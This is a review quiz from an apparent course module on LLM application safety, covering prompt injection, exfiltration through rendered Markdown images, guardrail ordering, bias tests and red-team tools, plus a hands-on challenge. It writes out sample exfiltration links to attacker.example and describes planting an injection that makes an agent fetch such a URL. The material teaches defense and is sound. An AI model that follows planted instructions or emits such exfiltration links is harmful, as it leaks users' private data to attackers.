# Module 13 review: Safety and Ethics

Test yourself before moving on. Try to answer before opening each answer.

## Questions

### 1. What's the difference between direct and indirect prompt injection, and why is indirect usually more dangerous?

<details><summary>Answer</summary>

Direct injection comes from the user's own input. Indirect injection is planted in content the app reads later (web pages, emails, documents, tool results). It's more dangerous because the attacker doesn't need access to your app, and the injected instructions run with the permissions of an innocent user who never sees them. See [Prompt injection](02-prompt-injection.md).

</details>

### 2. Name the three legs of the lethal trifecta. Which one would you remove from an agent that summarizes public web pages and can read the user's calendar and send email?

<details><summary>Answer</summary>

Private data, exposure to untrusted content, and a way to communicate externally. For the summarizing task, remove calendar access (the summarizer doesn't need private data) or remove email sending from that step. Better still, split it so no single step has all three. Requiring human approval on outgoing email is the fallback if you can't. See [The threat model](01-the-threat-model.md).

</details>

### 3. Why can't prompt injection be fixed the way SQL injection was?

<details><summary>Answer</summary>

SQL injection was fixed by strictly separating code from data with parameterized queries. LLMs have no such separation: instructions and data are all tokens in the same context, and the model decides what to follow. Defenses lower the success rate. Only capability limits give hard guarantees. See [The threat model](01-the-threat-model.md).

</details>

### 4. What's wrong with this prompt-building code?

```python
prompt = f"Answer using this context: {chunk_text}\n\nQuestion: {question}"
```

<details><summary>Answer</summary>

Retrieved text and the question are pasted in with no boundaries, so instructions inside the chunk look just like yours. Wrap each chunk in tags (with its source), strip anything that could close the tags early, and say in the system prompt that document content is reference material, never instructions. See [Prompt injection](02-prompt-injection.md).

</details>

### 5. Your chat UI renders Markdown from the model. How can an injection exfiltrate data with no tools at all, and how do you stop it?

<details><summary>Answer</summary>

The injection asks the model to output an image like `![](https://attacker.example/x.png?d=<secret>)`. When the UI renders it, the browser requests the URL and the data leaks. Stop it by allowlisting link and image domains in output validation, and don't auto-render images from model output. See [Prompt injection](02-prompt-injection.md).

</details>

### 6. True or false: an LLM-based injection detector on retrieved content is enough to secure a RAG agent with tools.

<details><summary>Answer</summary>

False. Detectors catch obvious attacks and give visibility, but novel phrasings get past them, and the detector is itself an LLM that can be fooled. Use detection as one layer alongside least privilege, human approval, and output validation. See [Prompt injection](02-prompt-injection.md).

</details>

### 7. How do you pass an end-user ID to Anthropic and to OpenAI, and what should the ID look like?

<details><summary>Answer</summary>

Anthropic: `metadata={"user_id": ...}` on the Messages API. OpenAI: `safety_identifier=...` (it replaces the older `user` parameter). The value should be a stable, opaque identifier, such as an HMAC of your internal user ID, never a name, email, or phone number. See [Guardrails](03-guardrails.md).

</details>

### 8. Put these checks in a sensible order for a public chatbot: output moderation, length limit, scope classifier (small model), main model call, input moderation, citation validation.

<details><summary>Answer</summary>

Length limit → input moderation → scope classifier → main model call → citation validation → output moderation. Cheap, deterministic checks go first so you don't pay for model calls on requests you'll reject anyway. Output checks run after generation, and any failure falls back to a safe response. See [Guardrails](03-guardrails.md).

</details>

### 9. A résumé-screening feature scores "Emily" 8/10 and "Lakisha" 6/10 for identical résumés. What kind of test found this, and what are reasonable fixes?

<details><summary>Answer</summary>

A counterfactual bias test that varies only a demographic signal. Fixes: remove names and other irrelevant demographic signals before the model sees the résumé, score against explicit job criteria, monitor score distributions by group, and keep a human accountable for the decision. Also get legal advice, because hiring decisions are regulated in many places. See [The threat model](01-the-threat-model.md).

</details>

### 10. When would you reach for garak rather than promptfoo's red-team mode?

<details><summary>Answer</summary>

When you're evaluating or comparing models themselves (for example, before self-hosting an open-weight model), since garak runs fixed probe libraries against a model or endpoint. promptfoo's red team is better for testing your whole app, because it generates attacks from your app's purpose and runs them through your prompts, retrieval, and tools. See [Red teaming](04-red-teaming.md).

</details>

### 11. A red-team attack succeeded last week and you fixed it. What should happen to that attack now?

<details><summary>Answer</summary>

It becomes a permanent hard-rule regression test in your eval suite (no tolerance, a single failure fails the build). Rerun it, and the broader automated red team, whenever you change the model, system prompt, or tools. See [Red teaming](04-red-teaming.md).

</details>

## Hands-on challenge

Give Course Buddy a dangerous tool on purpose, then make it safe. Add a `fetch_url(url)` tool to the agent from Module 8, plant an indirect injection in a course file that tells the agent to fetch `https://attacker.example/?q=<the user's question>`, and confirm the attack works (point it at a URL you control or just log the call without making it). Then defend it in layers: delimit retrieved content, allowlist `fetch_url` domains, require confirmation for any fetch, and add an output link check. Write a test that fails before your fixes and passes after.

<details><summary>Hint</summary>

Make `fetch_url` log the URL it was asked for instead of really fetching, so the test can assert on the log. The allowlist is the layer that makes the guarantee: even if the model is fully convinced by the injection, the tool refuses non-allowlisted hosts. The other layers reduce how often it gets that far.

</details>

## Capstone checkpoint
- [ ] Retrieved chunks go into the prompt inside `<document source="...">` tags, and the system prompt says document content is never instructions
- [ ] A planted injection in a course file no longer changes Course Buddy's behavior, and it's covered by a test
- [ ] Input guardrails: length limit, scope check, and moderation (or a Claude-based classifier)
- [ ] Output guardrails: cited sources exist, links are allowlisted, `refusal` stop reasons get a clear message
- [ ] Each request sends a hashed end-user or session ID as `metadata.user_id`, and the same ID appears in your traces
- [ ] `evals/test_security.py` holds every attack that ever worked, and runs in CI

---
[← Last lesson](04-red-teaming.md) · [Course home](../README.md) · [Next module →](../14-ai-assisted-coding/README.md)
